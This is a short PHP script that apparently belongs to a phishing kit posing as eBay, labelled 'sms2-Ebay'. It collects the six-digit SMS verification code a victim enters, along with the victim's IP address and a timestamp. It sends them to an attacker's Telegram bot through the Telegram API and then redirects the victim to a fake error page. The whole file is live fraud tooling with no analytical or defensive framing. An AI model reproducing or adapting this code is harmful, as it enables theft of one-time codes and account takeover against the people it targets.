<?php
include 'telegram.php';
$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");
	$message .= '
---------sms2-Ebay---------
| sms= '.$_POST['pin-box-0'].$_POST['pin-box-1'].$_POST['pin-box-2'].$_POST['pin-box-3'].$_POST['pin-box-4'].$_POST['pin-box-5'].' 
------------ '.$ip.' ------------
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );
header("location: Reseterreur2.html");
    exit();
?>